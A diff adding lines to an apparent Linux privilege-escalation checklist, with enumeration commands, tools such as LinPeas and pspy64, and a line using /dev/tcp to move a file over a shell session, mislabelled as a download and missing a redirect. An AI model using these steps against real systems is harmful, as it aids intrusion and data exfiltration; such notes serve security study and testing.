@@ -39,8 +39,18 @@ Everything to check when trying to become root
 - /etc/apache2 *(if a site is live)*
     - /etc/apache2/site-enabled
 
+# Useful linux programs,tools and commands
+- `jq`` --> Makes json data readable   
+    ```bash
+    cat <json_file> | jq
+    ```
+- `cat /proc/net/fib_trie` --> Shows network topography
+- `hostname` --> Shows domain name
+- `/etc/os-release` --> OS info and release
+- `cat <file> /dev/tcp/<ip>/<port>` --> Download file from shell session
 
-# Tools
+
+# Analysis tools
 - LinPeas
 - pspy64
 - [GTFOBins](https://gtfobins.github.io/) (online)
